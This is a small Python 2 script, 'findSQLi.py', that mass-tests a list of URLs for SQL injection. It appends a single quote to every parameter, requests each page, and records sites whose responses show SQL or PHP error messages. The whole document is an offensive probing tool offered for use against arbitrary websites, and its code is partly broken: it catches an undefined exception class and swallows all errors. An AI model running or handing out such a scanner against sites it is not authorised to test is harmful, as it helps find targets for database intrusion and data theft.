#!/usr/bin/python
## findSQLi.py
## Small tool for finding SQL Injections on a list of URLs by adding a single quote to all parameters
## Author: LokiSec
## Twitter: #iExploitXinapse
## Version 0.0.1
## Usage findSQLi.py [options]
import time, urllib2, optparse
 
parser = optparse.OptionParser()
options = optparse.OptionGroup(parser, 'Options')
parser.add_option('-i', '--iFile', action='store', type='string', help='File to Scan', metavar='iFile')
parser.add_option('-o', '--oFile', action='store', type='string', help='Filename to save', metavar='oFile')
parser.add_option('-v', '--verbose', action="store_true", dest="verbose", default=False, help="Adds extra status messages showing program execution")
(opts, args) = parser.parse_args()
urlno = 0
invuln = 0
if opts.iFile:
    iFilename = opts.iFile
else:
    print '>> Please enter an Inputfile'
if opts.oFile:
    filename = opts.oFile
else:
    print '>> Please enter a Outputfilename'
if opts.verbose:
    verbose = 'true'
else:
    verbose = 'false'

pagecount = 0
counter = 0

try:
    pagecount = pagecount + 1
    if verbose == 'true':
        print '>> Read Inputfile ' + str(pagecount) + '...'

    with open(iFilename) as f:
        tmp = f.readlines()     
     
       
    for t in tmp:
        try:
            url = t[:-1]
            if verbose == 'true':
                print '>> Testing ' + url + ' for vulnerabilities...'
            testurl = url + "'"
            testurl = testurl.replace("&","'&")
            if verbose == 'true':
                print '>> URL modified to ' + testurl + '...'
            if testurl.find("sql") == -1 and testurl.find("SQL") == -1:
                req = urllib2.urlopen(testurl, timeout = 3)
                data = req.read()
                if data.find("sql") > -1 or data.find("SQL") > -1 or data.find("Fatal error: Call")  > -1 or data.find(".php on line")  > -1:
                    f = open (filename, "a")
                    if verbose == 'true':
                        print '>> Found possible injection in ' + url
                    f.write(url + "\n")
                    f.close()
                    counter = counter + 1
                else:
                    invuln = invuln + 1
        except:
            errors = 1
 
 
except SearchError, e:
    print ">> Search failed: %s" % e
 
 
print '>> scan ended'
print '>> ' + str(counter) + ' vulnerable sites found'
print '>> ' + str(invuln) + ' sites not vulnerable'

